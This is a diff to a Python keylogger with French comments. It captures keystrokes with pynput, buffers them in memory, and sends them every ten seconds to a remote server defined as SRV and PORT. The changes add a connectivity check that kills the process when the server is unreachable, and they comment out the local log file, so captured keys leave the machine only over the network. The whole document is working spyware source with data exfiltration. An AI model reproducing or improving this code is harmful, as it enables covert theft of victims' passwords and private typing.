@@ -1,10 +1,13 @@
+import signal
+
 from env import *
 
 import argparse
 import socket
 import time
 import threading
-import  re
+import os
+import re
 from pynput.keyboard import Key, Listener
 
 
@@ -36,8 +39,12 @@ def pav_num(nombre):
         "< 105 >": 9,
     }
 
-def kill_all() :
-    print( "tout tuer ")
+
+def kill_all():
+
+    pid = os.getpid()
+    os.kill(pid, 9)
+
 
 def parse(srt):
 
@@ -54,10 +61,20 @@ def parse(srt):
 def kpr(key):
         global TXT_GLOB
         with open("keylog.txt", "a") as f:
-            f.write(parse(str(key)))
+            #f.write(parse(str(key)))
             TXT_GLOB += parse(str(key))
 
+def scan_socket():
+    try :
+        rsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP
 
+        rsocket.settimeout(0.5)  # définition du temps d'attente de la réponse
+
+        rsocket.connect((SRV, PORT))
+        print("Toujours Co !!")
+    except :
+        print("Pas Co !!")
+        kill_all()
 
 def chrono():
     global TXT_GLOB
@@ -66,6 +83,7 @@ def chrono():
         while True:
             print(f"Secondes : {seconds}")
             seconds += 1
+            scan_socket()
             time.sleep(1)
             if seconds % 10 == 0 :
                 send_t = threading.Thread(target=send(TXT_GLOB))
@@ -103,6 +121,13 @@ def commands(cmd):
     client_socket.send(cmd.encode('utf-8'))  ##envoi
 
     client_socket.close()
+
+
+
+
+
+
+
 
 
 
